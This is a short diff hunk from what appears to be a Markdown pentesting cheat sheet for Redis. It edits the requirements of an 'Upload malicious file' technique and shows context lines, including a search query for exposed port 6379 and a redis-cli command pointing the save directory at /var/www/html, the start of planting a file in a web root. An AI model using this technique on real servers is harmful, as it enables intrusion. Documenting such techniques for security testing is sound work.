@@ -14,7 +14,7 @@ I beg you to read [url:redis.io/security](http://redis.io/topics/security) if yo
 ` { product:"Redis key-value store", port:"6379" } `
 
 ##### Upload malicious file
-Requirement : access to CONFIG
+Requirement : access to CONFIG and (BGSAVE or SAVE)
 ```
 localhost:6379> config set dir /var/www/html
 OK
